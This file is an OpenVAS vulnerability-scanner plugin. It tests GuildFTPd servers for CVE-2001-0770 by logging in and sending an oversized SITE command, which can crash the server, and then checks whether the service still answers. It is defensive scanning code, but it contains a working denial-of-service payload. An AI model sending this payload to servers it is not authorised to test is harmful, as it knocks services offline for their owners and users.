# OpenVAS Vulnerability Test
# $Id: guildftpd_site_cmd_overflow.nasl 6040 2017-04-27 09:02:38Z teissa $
# Description: GuildFTPd Long SITE Command Overflow
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote ftp server seems to be vulnerable to denial service attack through
the SITE command when handling specially long request.";

tag_solution = "Upgrade or install another ftp server.";

#  Ref: andreas.junestam@defcom.com

if(description)
{
 script_id(15851);
 script_version("$Revision: 6040 $");
 script_tag(name:"last_modification", value:"$Date: 2017-04-27 11:02:38 +0200 (Thu, 27 Apr 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2782);
 script_cve_id("CVE-2001-0770");
 script_xref(name:"OSVDB", value:"5540");

 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 name = "GuildFTPd Long SITE Command Overflow";
 
 script_name(name);
 

 summary = "Sends an oversized SITE command to the remote server";
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 family = "FTP";
 script_family(family);
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# da code
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(get_port_state(port))
{
 banner = get_ftp_banner(port:port);
 if ( ! banner || "GuildFTP" >!< banner ) exit(0);
 login = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");

 if(login)
 {
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  if(ftp_authenticate(socket:soc, user:login,pass:password))
  {
   data = string("SITE ", crap(262), "\r\n");
   send(socket:soc, data:data);
   reply = ftp_recv_line(socket:soc);
   sleep(1);
   soc2 = open_sock_tcp(port);
   if(!soc2)
   {
     security_message(port);
   }
   close(soc2);
   data = string("QUIT\n");
   send(socket:soc, data:data);
  }
  close(soc);
 }
}
